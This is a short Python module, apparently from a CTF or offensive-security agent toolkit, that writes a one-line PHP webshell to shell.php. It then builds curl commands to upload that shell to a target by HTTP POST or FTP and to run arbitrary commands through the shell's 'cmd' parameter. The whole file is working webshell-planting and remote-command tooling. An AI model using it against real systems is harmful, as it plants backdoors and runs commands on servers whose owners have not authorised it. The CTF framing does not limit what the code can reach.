"""
PHP webshell and curl utilities for web exploitation
"""


def generate_php_webshell(target_url=None, port=None,
                          protocol="http", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
    """
    Upload and generate a basic PHP webshell and uploads it via HTTP or FTP

    Args:
        target_url: Target URL to upload shell to
        port: Port number to use (default: 80 for HTTP, 21 for FTP)
        protocol: Protocol to use - 'http' or 'ftp' (default: http)
        ctf: CTF object to use for context

    Returns:
        Tuple of (webshell content, upload command)
    """
    with open('shell.php', 'w', encoding='utf-8') as f:
        f.write("""<?php system($_GET['cmd']); ?>""")
    webshell = """<?php system($_GET['cmd']); ?>"""

    if not target_url:
        return webshell

    if not port:
        port = 21 if protocol == "ftp" else 80

    if protocol == "ftp":
        upload_cmd = f"curl -T shell.php ftp://{target_url}:{port}/"
    else:
        # HTTP POST upload
        upload_cmd = f"curl -X POST http://{
            target_url}:{port} -F 'file=@shell.php'"

    return webshell, upload_cmd


def curl_webshell(url, command, cmd_param="cmd"):
    """
    Sends command to PHP webshell via curl

    Args:
        url: URL of the webshell
        command: Command to execute
        cmd_param: GET parameter name for command (default: cmd)

    Returns:
        Command to execute with curl
    """
    encoded_cmd = command.replace(" ", "+")
    return f"curl '{url}?{cmd_param}={encoded_cmd}'"


def upload_webshell(url, filename="shell.php", ctf=None):  # pylint: disable=unused-argument  # noqa: E501
    """
    Generates curl command to upload PHP webshell

    Args:
        url: Target URL for upload
        filename: Name of shell file (default: shell.php)
        ctf: CTF object to use for context

    Returns:
        Tuple of (webshell content, curl upload command)
    """
    shell = generate_php_webshell()
    curl_cmd = f"""curl -X POST {url} -F "file=@{filename}" """
    return shell, curl_cmd
